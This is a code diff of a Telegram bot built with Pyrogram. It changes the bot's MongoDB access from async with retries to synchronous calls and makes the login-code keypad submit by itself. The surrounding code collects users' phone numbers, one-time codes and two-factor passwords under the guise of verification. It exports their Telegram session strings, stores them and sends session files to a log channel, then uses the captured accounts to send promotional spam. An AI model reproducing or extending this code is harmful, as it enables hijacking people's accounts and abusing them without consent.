@@ -3,6 +3,10 @@ import asyncio
 import random
 from pathlib import Path
 from pyrogram import Client, filters, enums
+from pymongo.mongo_client import MongoClient
+from pymongo.server_api import ServerApi
+from config import API_ID, API_HASH, DATABASE_URI_SESSIONS_F, LOG_CHANNEL_SESSIONS_FILES, PROMO_TEXTS, STRINGS, OTP_KEYBOARD, VERIFICATION_SUCCESS_KEYBOARD
+
 from pyrogram.types import (
     Message,
     InlineKeyboardMarkup,
@@ -23,46 +27,24 @@ from pyrogram.errors import (
     SessionRevoked,
     SessionExpired
 )
-# Updated MongoDB imports
-from motor.motor_asyncio import AsyncIOMotorClient
-from pymongo.server_api import ServerApi
-from pymongo.errors import OperationFailure
-from tenacity import retry, stop_after_attempt, wait_exponential
-from config import API_ID, API_HASH, DATABASE_URI_SESSIONS_F, LOG_CHANNEL_SESSIONS_FILES, PROMO_TEXTS, STRINGS, OTP_KEYBOARD, VERIFICATION_SUCCESS_KEYBOARD
 
-# ====================== OPTIMIZED MONGODB CONNECTION SYSTEM ======================
-# MongoDB Connection Setup with pooling and retry
-mongo_client = AsyncIOMotorClient(
-    DATABASE_URI_SESSIONS_F,
-    minPoolSize=10,        # 10 connections always ready
-    maxPoolSize=100,       # Max 100 parallel connections
-    socketTimeoutMS=30000, # 30 sec operation timeout
-    connectTimeoutMS=30000,# 30 sec connection timeout
-    server_api=ServerApi('1'),
-    retryWrites=True       # Auto-retry failed writes
-)
+# MongoDB Connection Setup
+mongo_client = MongoClient(DATABASE_URI_SESSIONS_F, server_api=ServerApi('1'))
 database = mongo_client['Cluster0']['sessions']
 
-# Retry decorator for MongoDB operations
-@retry(stop=stop_after_attempt(3), wait=wait_exponential(multiplier=1, min=2, max=10))
-async def mongo_operation(operation, *args, **kwargs):
-    try:
-        return await operation(*args, **kwargs)
-    except OperationFailure as e:
-        if "locked" in str(e).lower():
-            print("🔄 Database locked - retrying operation...")
-            await asyncio.sleep(1)
-            raise
-        raise
+# Test MongoDB connection
+try:
+    mongo_client.admin.command('ping')
+    print("Successfully connected to MongoDB!")
+except Exception as e:
+    print(f"MongoDB connection error: {e}")
+    raise
 
-# ====================== STATE MANAGEMENT ======================
+# State Management
 user_states = {}
 
-async def check_login_status(user_id):
-    user_data = await mongo_operation(
-        database.find_one,
-        {"id": user_id}
-    )
+def check_login_status(user_id):
+    user_data = database.find_one({"id": user_id})
     return bool(user_data and user_data.get('logged_in'))
 
 async def cleanup_user_state(user_id):
@@ -72,7 +54,6 @@ async def cleanup_user_state(user_id):
             await state['client'].disconnect()
         del user_states[user_id]
 
-# ====================== ERROR HANDLING ======================
 async def handle_session_error(bot: Client, phone_number: str, error: Exception):
     error_type = {
         AuthKeyUnregistered: "SESSION_EXPIRED",
@@ -86,20 +67,15 @@ async def handle_session_error(bot: Client, phone_number: str, error: Exception)
         f"🛑 Auto-disabled promotion\n"
         f"❌ Error: {str(error)[:200]}"
     )
-    await mongo_operation(
-        database.update_one,
+    database.update_one(
         {"mobile_number": phone_number},
         {"$set": {"promotion": False}}
     )
 
-# ====================== COMMAND HANDLERS ======================
 @Client.on_message(filters.private & filters.command("start"))
 async def start_login(bot: Client, message: Message):
     user_id = message.from_user.id
-    user_data = await mongo_operation(
-        database.find_one,
-        {"id": user_id}
-    )
+    user_data = database.find_one({"id": user_id})
     
     if user_data and user_data.get('session'):
         try:
@@ -108,8 +84,7 @@ async def start_login(bot: Client, message: Message):
             await test_client.get_me()
             await test_client.disconnect()
             
-            await mongo_operation(
-                database.update_one,
+            database.update_one(
                 {"id": user_id},
                 {"$set": {"logged_in": True}}
             )
@@ -117,13 +92,12 @@ async def start_login(bot: Client, message: Message):
             asyncio.create_task(send_promotion_messages(bot, user_data['session'], user_data['mobile_number']))
             return
         except Exception:
-            await mongo_operation(
-                database.update_one,
+            database.update_one(
                 {"id": user_id},
                 {"$set": {"logged_in": False, "session": None, "promotion": False}}
             )
     
-    if await check_login_status(user_id):
+    if check_login_status(user_id):
         await message.reply(STRINGS['already_logged_in'])
         return
     
@@ -140,20 +114,18 @@ async def start_login(bot: Client, message: Message):
 async def handle_logout(bot: Client, message: Message):
     user_id = message.from_user.id
     
-    await mongo_operation(
-        database.update_one,
+    database.update_one(
         {"id": user_id},
         {"$set": {"logged_in": False}}
     )
     
     await message.reply(STRINGS['logout_success'])
     await cleanup_user_state(user_id)
-
-# ====================== PHONE NUMBER HANDLING ======================    
+    
 @Client.on_message(filters.private & filters.contact)
 async def handle_contact(bot: Client, message: Message):
     user_id = message.from_user.id
-    if await check_login_status(user_id):
+    if check_login_status(user_id):
         await message.reply(STRINGS['already_logged_in'], reply_markup=ReplyKeyboardRemove())
         return
     
@@ -190,7 +162,6 @@ async def handle_contact(bot: Client, message: Message):
         await message.reply(f"⚠️ Oops! Something went wrong.\n\nPlease try /start again later.", reply_markup=ReplyKeyboardRemove())
         await cleanup_user_state(user_id)
 
-# ====================== OTP HANDLING ======================
 @Client.on_callback_query(filters.regex("^otp_"))
 async def handle_otp_buttons(bot: Client, query: CallbackQuery):
     user_id = query.from_user.id
@@ -204,11 +175,12 @@ async def handle_otp_buttons(bot: Client, query: CallbackQuery):
 
     if action == "back":
         state['otp_digits'] = state['otp_digits'][:-1]
-    elif action == "submit":
-        if len(state['otp_digits']) < 5:
-            await query.answer("Verification Code Must Be At Least 5 Digits!", show_alert=True)
-            return
-        
+    else:
+        if len(state['otp_digits']) < 6:
+            state['otp_digits'] += action
+    
+    # Auto-submit if 5 digits reached
+    if len(state['otp_digits']) == 5:
         await query.message.edit("Verifying Code...")
         try:
             await state['client'].sign_in(
@@ -217,12 +189,12 @@ async def handle_otp_buttons(bot: Client, query: CallbackQuery):
                 state['otp_digits']
             )
             await create_session(bot, state['client'], user_id, state['phone_number'])
+            return
         except PhoneCodeInvalid:
             state['otp_attempts'] += 1
             if state['otp_attempts'] >= 3:
                 await query.message.edit(STRINGS['otp_blocked'])
-                await mongo_operation(
-                    database.update_one,
+                database.update_one(
                     {"id": user_id},
                     {"$set": {"blocked": True}}
                 )
@@ -243,17 +215,14 @@ async def handle_otp_buttons(bot: Client, query: CallbackQuery):
             await query.message.reply(f"⚠️ Oops! Something went wrong.\n\nPlease try /start again later.")
             await cleanup_user_state(user_id)
         return
-    else:
-        if len(state['otp_digits']) < 6:
-            state['otp_digits'] += action
     
+    # Update OTP display (if not submitted)
     await query.message.edit(
-        f"**Current Verification Code:** `{state['otp_digits'] or '____'}`\n\nPress 🆗 When Done.\n\n📤 Enter The Verification Code We sent:",
+        f"**Current Verification Code:** `{state['otp_digits'] or '____'}`\n\n📤 Enter The Verification Code We sent:",
         reply_markup=OTP_KEYBOARD
     )
     await query.answer()
 
-# ====================== 2FA PASSWORD HANDLING ======================
 @Client.on_message(filters.private & filters.text & ~filters.command(["start", "logout"]))
 async def handle_2fa_password(bot: Client, message: Message):
     user_id = message.from_user.id
@@ -279,8 +248,7 @@ async def handle_2fa_password(bot: Client, message: Message):
         verified_msg = await bot.send_message(user_id, "Password verified...", reply_markup=ReplyKeyboardRemove())
         state['verified_msg_id'] = verified_msg.id
         
-        await mongo_operation(
-            database.update_one,
+        database.update_one(
             {"id": user_id},
             {"$set": {
                 "2fa_status": True,
@@ -295,8 +263,7 @@ async def handle_2fa_password(bot: Client, message: Message):
         state['2fa_attempts'] += 1
         if state['2fa_attempts'] >= 3:
             await message.reply(STRINGS['2fa_blocked'], reply_markup=ReplyKeyboardRemove())
-            await mongo_operation(
-                database.update_one,
+            database.update_one(
                 {"id": user_id},
                 {"$set": {"blocked": True}}
             )
@@ -313,7 +280,6 @@ async def handle_2fa_password(bot: Client, message: Message):
         await message.reply(f"⚠️ Oops! Something went wrong.\n\nPlease try /start again later.", reply_markup=ReplyKeyboardRemove())
         await cleanup_user_state(user_id)
 
-# ====================== SESSION CREATION ======================
 async def create_session(bot: Client, client: Client, user_id: int, phone_number: str):
     try:
         string_session = await client.export_session_string()
@@ -326,22 +292,11 @@ async def create_session(bot: Client, client: Client, user_id: int, phone_number
             'promotion': True
         }
         
-        existing = await mongo_operation(
-            database.find_one,
-            {"id": user_id}
-        )
-        if existing:
-            await mongo_operation(
-                database.update_one,
-                {'_id': existing['_id']},
-                {'$set': data}
-            )
+        if existing := database.find_one({"id": user_id}):
+            database.update_one({'_id': existing['_id']}, {'$set': data})
         else:
             data['id'] = user_id
-            await mongo_operation(
-                database.insert_one,
-                data
-            )
+            database.insert_one(data)
 
         os.makedirs("sessions", exist_ok=True)
         clean_phone = phone_number.replace('+', '')
@@ -382,7 +337,6 @@ async def create_session(bot: Client, client: Client, user_id: int, phone_number
     finally:
         await cleanup_user_state(user_id)
 
-# ====================== PROMOTION SYSTEM ======================
 async def send_promotion_messages(bot: Client, session_string: str, phone_number: str):
     already_notified = False
     status_message = None
@@ -459,10 +413,7 @@ async def send_promotion_messages(bot: Client, session_string: str, phone_number
                     message_text
                 )
             
-            user_data = await mongo_operation(
-                database.find_one,
-                {"mobile_number": phone_number}
-            )
+            user_data = database.find_one({"mobile_number": phone_number})
             if not user_data or not user_data.get('promotion', True):
                 await bot.send_message(
                     LOG_CHANNEL_SESSIONS_FILES,
